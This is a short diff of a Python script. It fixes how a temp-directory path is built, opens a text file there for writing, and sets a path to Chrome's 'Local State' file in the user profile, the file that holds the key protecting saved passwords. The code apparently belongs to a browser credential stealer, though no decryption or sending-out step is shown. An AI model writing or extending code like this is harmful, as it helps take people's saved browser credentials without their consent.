@@ -12,7 +12,7 @@ import tempfile
 
 temp_dir = tempfile.gettempdir()
 
-tmpdir = f"Temporary directory: {temp_dir}"
+tmpdir = f"{temp_dir}"
 tmpfile = os.path.join(tmpdir,'text.txt')
 temp_file = open(tmpfile,'w')
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
